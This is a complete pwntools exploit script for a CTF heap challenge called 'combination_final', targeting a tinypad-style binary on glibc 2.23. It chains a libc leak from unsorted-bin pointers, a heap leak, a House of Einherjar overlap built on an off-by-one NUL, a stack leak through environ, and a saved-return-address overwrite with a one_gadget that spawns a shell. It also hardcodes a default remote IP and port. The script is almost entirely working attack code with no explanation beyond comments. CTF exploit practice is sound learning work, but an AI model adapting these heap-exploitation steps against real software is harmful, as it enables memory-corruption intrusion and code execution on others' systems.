#!/usr/bin/env python3
# Exploit for combination_final / tinypad-style heap challenge
# Usage examples:
#   python3 exp_combination_final.py REMOTE HOST=1.2.3.4 PORT=10001
#   python3 exp_combination_final.py LD=./ld-2.23.so
from pwn import *

context.binary = exe = ELF('./combination_final', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
context.log_level = 'info'

PROMPT_CMD = b'[*] COMMAND >> '
PROMPT_SIZE = b'[*] MEM_SIZE >> '
PROMPT_DATA = b'[*] MEM_DATA >> '
PROMPT_IDX = b'[*] INDEX_ID >> '
PROMPT_YN = b'[?] APPLY_CHANGE? (Y/n) >> '

TINYPAD = exe.symbols['tinypad']          # 0x404040
FAKE_CHUNK = TINYPAD + 0xc0               # 0x404100 – size field at 0x404108 lands in the gap (not in tinypad data)
CHUNK3_HDR_OFF = 0x1a0                    # heap_base + this == chunk3 header in grooming stage

# For glibc-2.23 amd64: main_arena = __malloc_hook + 0x10; unsorted fd/bk = main_arena + 0x58
MAIN_ARENA = libc.symbols['__malloc_hook'] + 0x10
UNSORTED_LEAK_OFF = MAIN_ARENA + 0x58
ENVIRON_OFF = libc.symbols['environ']

# Common one_gadget offsets for Ubuntu glibc 2.23. Override with GADGET=0x.... if needed.
ONE_GADGET = int(args.GADGET, 0) if args.GADGET else 0xf1147
STACK_OFF = int(args.STACKOFF, 0) if args.STACKOFF else 0xf0
DEAD = 0xdeadbeefdeadbeef


def start():
    if args.REMOTE:
        host = args.HOST or '39.96.193.120'
        port = int(args.PORT or 10003)
        return remote(host, port)
    if args.LD:
        return process([args.LD, exe.path], env={'LD_PRELOAD': libc.path})
    return process(exe.path)

io = start()


def cmd(c: bytes):
    io.sendlineafter(PROMPT_CMD, c)


def add(size: int, data: bytes):
    cmd(b'A')
    io.sendlineafter(PROMPT_SIZE, str(size).encode())
    io.sendafter(PROMPT_DATA, data + b'\n')


def delete(idx: int):
    cmd(b'D')
    io.sendlineafter(PROMPT_IDX, str(idx).encode())


def edit(idx: int, data: bytes, confirm: bytes = b'Y'):
    cmd(b'E')
    io.sendlineafter(PROMPT_IDX, str(idx).encode())
    io.sendafter(PROMPT_DATA, data + b'\n')
    io.sendlineafter(PROMPT_YN, confirm)


def recv_content(idx: int) -> bytes:
    tag = f' #   INDEX: {idx}\n # CONTENT: '.encode()
    io.recvuntil(tag)
    return io.recvuntil(b'\n', drop=True)


def u64pad(x: bytes) -> int:
    return u64(x[:8].ljust(8, b'\x00'))


def leak_libc() -> int:
    # A 0x100 request produces a 0x110 smallbin-sized chunk. After free, fd/bk leak arena pointers.
    for _ in range(4):
        add(0x100, b'\x00' * 0xc8)
    delete(3)
    leak = u64pad(recv_content(3))
    libc.address = leak - UNSORTED_LEAK_OFF
    log.success(f'libc leak = {hex(leak)}, libc base = {hex(libc.address)}')
    return libc.address


def leak_heap() -> int:
    # Reset, then free two fast/small chunks so the first freed chunk's fd points to another heap chunk.
    delete(4)
    delete(2)
    delete(1)
    for _ in range(3):
        add(30, b'a' * 5)
    add(0x100, b'\x00' * 0xc8)
    delete(3)
    delete(1)
    leak = u64pad(recv_content(1))
    heap_base = leak - 0x60
    log.success(f'heap leak = {hex(leak)}, heap base = {hex(heap_base)}')
    return heap_base


def house_of_einherjar(heap_base: int):
    # Clean the remaining live chunks from leak_heap().
    delete(2)
    delete(4)

    add(200, b'a' * 190)      # idx 1, chunk size 0xd0
    add(200, b'a' * 190)      # idx 2, chunk size 0xd0, will corrupt idx3 metadata
    add(240, b'a' * 200)      # idx 3, chunk size 0x100

    # Free idx2, then reallocate it with exactly 200 bytes:
    # - last 8 bytes become idx3.prev_size
    # - terminating NUL clears idx3.size low byte / prev_inuse bit
    delete(2)
    prev_size = heap_base + CHUNK3_HDR_OFF - FAKE_CHUNK
    add(200, b'c' * 192 + p64(prev_size))

    # Make a self-consistent fake chunk at FAKE_CHUNK (0x404100). size=0xb0 so
    # consolidated chunk covers slot[0].size at 0x404140. fd/bk self-ref passes unlink.
    fake = b'\x00' * 0x18 + p64(0xb0) + p64(FAKE_CHUNK) + p64(FAKE_CHUNK)
    edit(3, fake)

    # Free idx3. Backward consolidation starts from the fake BSS chunk, creating a huge free chunk
    # whose next malloc returns inside tinypad and lets us overwrite the memo metadata.
    delete(3)
    log.success('House of Einherjar completed; next allocation overlaps tinypad metadata')


def leak_stack() -> int:
    # After House of Einherjar, consolidated chunk at 0x404100, size 0x1b0.
    # malloc(0x90) returns 0x404110. offset 0x30 → slot[0].size, 0x38 → slot[0].ptr.
    environ_addr = libc.address + ENVIRON_OFF
    payload = b'A' * 0x30 + p64(DEAD) + p64(environ_addr)
    add(0x90, payload.ljust(0x90, b'A'))
    stack_environ = u64pad(recv_content(1))  # user idx 1 → internal slot[0]
    retaddr = stack_environ - STACK_OFF
    log.success(f'environ = {hex(stack_environ)}, target saved RIP = {hex(retaddr)}')
    return retaddr


def pwn():
    leak_libc()
    heap_base = leak_heap()
    house_of_einherjar(heap_base)
    retaddr = leak_stack()

    # After leak_stack(), slot[2].ptr = 0x404110. edit(3, payload) writes there.
    # offset 0x30 → slot[0].size, offset 0x38 → slot[0].ptr.
    payload = b'A' * 0x30 + p64(DEAD) + p64(retaddr)
    edit(3, payload)      # overwrites slot[0].ptr → saved return address

    one = libc.address + ONE_GADGET
    log.success(f'one_gadget = {hex(one)}')
    edit(1, p64(one))     # user idx 1 → slot[0].ptr → writes one_gadget to retaddr
    cmd(b'Q')
    io.interactive()


if __name__ == '__main__':
    pwn()
